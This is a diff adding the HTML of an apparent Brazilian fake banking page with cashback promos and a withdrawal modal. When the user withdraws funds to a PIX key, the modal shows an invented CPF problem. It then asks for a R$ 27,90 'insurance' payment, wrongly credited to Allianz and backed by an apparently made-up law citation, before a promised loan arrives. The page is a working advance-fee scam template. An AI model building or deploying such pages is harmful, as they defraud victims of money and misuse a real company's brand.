+                                <span class="promo-link">Ativar ></span>
+                            </div>
+                            <div class="promo-image">
+                                <img src="images/dov823WfaGiw.webp" alt="Open Finance" data-pagespeed-url-hash="3468153719" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                        </div>
+                    </div>
+                                        
+                    <div class="carousel-item">
+                        <div class="promo-card bg-primary text-white" data-mini-alert="true">
+                            <div class="promo-content">
+                                <h4 class="promo-title mb-2">CDB 105% do CDI</h4>
+                                <p class="promo-description">Invista e tenha rentabilidade<br>em 1 ano</p>
+                                <span class="promo-link">Garantir Oferta ></span>
+                            </div>
+                            <div class="promo-image">
+                                <img src="images/YQaWbhUnNXo2.webp" alt="CDB" data-pagespeed-url-hash="3317721693" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- <button class="carousel-control-prev" type="button" data-bs-target="#carouselPromo" data-bs-slide="prev">
+                    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+                    <span class="visually-hidden">Anterior</span>
+                </button>
+                <button class="carousel-control-next" type="button" data-bs-target="#carouselPromo" data-bs-slide="next">
+                    <span class="carousel-control-next-icon" aria-hidden="true"></span>
+                    <span class="visually-hidden">Próximo</span>
+                </button> -->
+                
+                <div class="carousel-indicators">
+                    <button type="button" data-bs-target="#carouselPromo" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
+                    <button type="button" data-bs-target="#carouselPromo" data-bs-slide-to="1" aria-label="Slide 2"></button>
+                    <button type="button" data-bs-target="#carouselPromo" data-bs-slide-to="2" aria-label="Slide 3"></button>
+                </div>
+            </div>
+        </div>
+
+
+        <div class="container mt-4">
+            <h4 class="mb-3">Promoções e cashback</h4>
+            
+            <div class="cashback-slider">
+                <div class="cashback-scroll">
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="images/2tywVApnVSTf.png" class="card-img-top" alt="Renner" data-pagespeed-url-hash="4020540912" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Renner</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="images/u0bxMohO5BU0.png" class="card-img-top" alt="Netshoes" data-pagespeed-url-hash="20073537" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Netshoes</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="images/9aBgwdjicTzS.png" class="card-img-top" alt="Natura" data-pagespeed-url-hash="314573458" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Natura</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="images/9Q5oGkdiauwm.png" class="card-img-top" alt="Casas Bahia" data-pagespeed-url-hash="609073379" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Casas Bahia</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="images/PvJ32myxdBsN.png" class="card-img-top" alt="Madeira Madeira" data-pagespeed-url-hash="903573300" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Madeira Madeira</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="images/iYE7PZkzcuHA.png" class="card-img-top" alt="Kabum" data-pagespeed-url-hash="1198073221" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Kabum</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="images/2tywVApnVSTf.png" class="card-img-top" alt="Renner" data-pagespeed-url-hash="4020540912" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Renner</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="images/u0bxMohO5BU0.png" class="card-img-top" alt="Netshoes" data-pagespeed-url-hash="20073537" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Netshoes</h6>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-4 col-md-3">
+                        <div class="card border-0 overflow-visible" data-mini-alert="true">
+                            <div class="rounded-4 overflow-hidden mb-2">
+                                <img src="images/9aBgwdjicTzS.png" class="card-img-top" alt="Natura" data-pagespeed-url-hash="314573458" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Natura</h6>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="container mt-4">
+            <h4 class="mb-3">Serviços</h4>
+            
+            <div class="horizontal-buttons">
+                <div class="card action-button mb-2" data-mini-alert="true">
+                    <div class="card-body d-flex justify-content-between align-items-center py-3">
+                        <span class="action-text">Investimentos</span>
+                        <div class="action-icon-circle">
+                            <i class="bi bi-graph-up-arrow"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card action-button mb-2" data-mini-alert="true">
+                    <div class="card-body d-flex justify-content-between align-items-center py-3">
+                        <span class="action-text">Cartões</span>
+                        <div class="action-icon-circle">
+                            <i class="bi bi-credit-card"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card action-button mb-2" data-mini-alert="true">
+                    <div class="card-body d-flex justify-content-between align-items-center py-3">
+                        <span class="action-text">Empréstimos</span>
+                        <div class="action-icon-circle">
+                            <i class="bi bi-cash-stack"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card action-button mb-2" data-mini-alert="true">
+                    <div class="card-body d-flex justify-content-between align-items-center py-3">
+                        <span class="action-text">Seguros</span>
+                        <div class="action-icon-circle">
+                            <i class="bi bi-shield-check"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card action-button mb-2" data-mini-alert="true">
+                    <div class="card-body d-flex justify-content-between align-items-center py-3">
+                        <span class="action-text">Central de Segurança</span>
+                        <div class="action-icon-circle">
+                            <i class="bi bi-lock"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <div class="modal fade" id="saqueModal" tabindex="-1" aria-labelledby="saqueModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content rounded-4">
+                <div class="modal-header border-0 pb-0">
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Fechar"></button>
+                </div>
+                <div class="modal-body px-4 pt-0 pb-4">
+                    <div id="loadingScreen" class="text-center py-5 d-none">
+                        <div class="spinner-border text-primary mb-3" role="status">
+                            <span class="visually-hidden">Carregando...</span>
+                        </div>
+                        <h5 class="mb-3" id="loadingText">Realizando saque...</h5>
+                        <div id="errorMessage" class="text-danger fw-bold d-none">
+                            Há pendências no CPF: <span id="userCpfError">123.456.789-00</span>, regularize para concluir o saque
+                        </div>
+                    </div>
+                    
+                    <div id="errorCard" class="d-none">
+                        <div class="text-center mb-4">
+                        </div>
+                        
+                        <h4 class="fw-bold text-center mb-3">Garanta seu empréstimo agora</h4>
+                        <p class="text-center text-muted mb-4">Seu empréstimo está quase pronto, falta apenas confirmar alguns detalhes</p>
+                        
+                        <div class="card bg-primary text-white mb-4 rounded-3">
+                            <div class="card-body p-3" style="background-color: #003781; border-radius: 0.5rem; font-family: 'Segoe UI', sans-serif;">
+                                <div class="d-flex align-items-center mb-2">
+                                    <img src="images/WmAPRWFqIGgD.svg" alt="Allianz" class="me-2" style="height: 30px; filter: brightness(0) invert(1);">
+                                </div>
+                                <p class="mb-2 small">A Allianz Seguradora será responsável pela segurança do seu empréstimo e por qualquer saldo que você não consiga pagar.</p>
+                                <p class="mb-0 small">A taxa do seguro será 100% devolvida para você automaticamente após a quitação do empréstimo, conforme a sanção na lei do empréstimo nº 10.820/2023.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="mb-4">
+                            <h5 class="fw-bold mb-3">Detalhamento da Tarifa do Seguro</h5>
+                            <div class="d-flex justify-content-between border-bottom pb-2 mb-2">
+                                <span>Declaração de seguro</span>
+                                <span class="fw-bold">R$ 7,99</span>
+                            </div>
+                            <div class="d-flex justify-content-between border-bottom pb-2 mb-2">
+                                <span>Proteção da seguradora</span>
+                                <span class="fw-bold">R$ 10,27</span>
+                            </div>
+                            <div class="d-flex justify-content-between border-bottom pb-2 mb-2">
+                                <span>Apólice virtual</span>
+                                <span class="fw-bold">R$ 9,64</span>
+                            </div>
+                            <div class="d-flex justify-content-between mt-2">
+                                <span class="fw-bold">Total do seguro</span>
+                                <span class="fw-bold text-success">R$ 27,90</span>
+                            </div>
+                        </div>
+                        
+                        <div class="card bg-success bg-opacity-10 border-success mb-4 rounded-3">
+                            <div class="card-body p-3">
+                                <h5 class="text-success mb-2">
+                                    <i class="bi bi-check-circle-fill me-2"></i>
+                                    Valor do empréstimo
+                                </h5>
+                                <h3 class="text-success fw-bold mb-2" id="valorEmprestimoDisplay">R$ 0,00</h3>
+                                <p class="small mb-0 text-success">Após o pagamento da seguradora, você receberá o valor em até 10 minutos</p>
+                                <small class="text-muted">Chave PIX: <span id="chavePixDisplay">HUH</span></small>
+                            </div>
+                        </div>
+                        
+                        <div class="text-center mb-3">
+                            <h3 class="fw-bold">R$ 27,90</h3>
+                        </div>
+                        
+                        <button class="btn btn-success btn-lg w-100 rounded-3 mb-3" id="regularizeBtn" style="background-color: #001664; border-color: #001664;">
+                            <i class="fa-brands fa-pix me-2"></i> Pagar agora
+                        </button>
+                        
+                        <p class="small text-muted text-center mb-0">
+                            O pagamento será confirmado imediatamente
+                        </p>
+                        <div class="text-center">
+                            <span class="badge bg-success bg-opacity-10 text-success">
+                                <i class="bi bi-shield-check me-1"></i>
+                                Processo 100% seguro
+                            </span>
+                        </div>
+                    </div>
+                    
+                    <div id="mainWithdrawContent">
+                        <div class="card conta-card rounded-4 text-white mb-4">
+                            <div class="card-body p-3">
+                                <div class="small opacity-75">Seu saldo</div>
+                                <h3 class="fw-bold mb-0" id="modalSaldoValue">R$ 0,00</h3>
+                            </div>
+                        </div>
+                        
+                        <h5 class="mb-3">Selecione o tipo de chave PIX</h5>
+                        
+                        <div class="pix-key-options mb-4">
+                            <div class="row flex-nowrap overflow-auto snap-scroll pb-2">
+                                <div class="col-3 col-md-3 text-center">
+                                    <div class="card action-icon-card bg-light mx-auto mb-2 pix-key-option" data-key-type="cpf">
+                                        <div class="d-flex justify-content-center align-items-center h-100">
+                                            <i class="bi bi-person-vcard fs-4"></i>
+                                        </div>
+                                    </div>
+                                    <p class="mb-0 small">CPF/CNPJ</p>
+                                </div>
+                                
+                                <div class="col-3 col-md-3 text-center">
+                                    <div class="card action-icon-card bg-light mx-auto mb-2 pix-key-option" data-key-type="telefone">
+                                        <div class="d-flex justify-content-center align-items-center h-100">
+                                            <i class="bi bi-telephone fs-4"></i>
+                                        </div>
+                                    </div>
+                                    <p class="mb-0 small">Telefone</p>
+                                </div>
+                                
+                                <div class="col-3 col-md-3 text-center">
+                                    <div class="card action-icon-card bg-light mx-auto mb-2 pix-key-option" data-key-type="email">
+                                        <div class="d-flex justify-content-center align-items-center h-100">
+                                            <i class="bi bi-envelope fs-4"></i>
+                                        </div>
+                                    </div>
+                                    <p class="mb-0 small">E-mail</p>
+                                </div>
+                                
+                                <div class="col-3 col-md-3 text-center">
+                                    <div class="card action-icon-card bg-light mx-auto mb-2 pix-key-option" data-key-type="aleatoria">
+                                        <div class="d-flex justify-content-center align-items-center h-100">
+                                            <i class="bi bi-shuffle fs-4"></i>
+                                        </div>
+                                    </div>
+                                    <p class="mb-0 small">Aleatória</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="mb-3">
+                            <input type="text" class="form-control form-control-lg rounded-4 mb-3" id="pixKeyInput" placeholder="Digite sua chave PIX aqui">
+                            <input type="text" class="form-control form-control-lg rounded-4" id="withdrawAmount" placeholder="Digite o valor que deseja sacar">
+                        </div>
+                        
+                        <button class="btn btn-primary btn-lg w-100 rounded-pill mt-3" id="confirmWithdraw">
+                            REALIZAR SAQUE
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <nav class="fixed-bottom bg-primary shadow-lg">
+        <div class="container">
+            <div class="row text-center py-2">
+                <div class="col-4">
+                    <a href="#" class="text-white d-block text-decoration-none active">
+                        <i class="bi bi-house-door fs-4"></i>
+                        <div class="small">Principal</div>
+                    </a>
+                </div>
+                <div class="col-4">
+                    <a href="#" class="text-white d-block text-decoration-none">
+                        <i class="bi bi-currency-dollar fs-4"></i>
+                        <div class="small">Saques</div>
+                    </a>
+                </div>
+                <div class="col-4">
+                    <a href="#" class="text-white d-block text-decoration-none">
+                        <i class="bi bi-person fs-4"></i>
+                        <div class="small">Meus dados</div>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <script src="js/hcfJo0SOyNQa.js"></script>
+    <script src="js/app%252C_js%252C_dashboard.js%252Bassets%252C_js%252C_pixel.js.pagespeed.jc.1zNJqIZSZV.js"></script><script>eval(mod_pagespeed_1dQfKcZ_dT);</script>
+    <script>eval(mod_pagespeed_M$QtKs9_ah);</script>
+
+ </body></html>
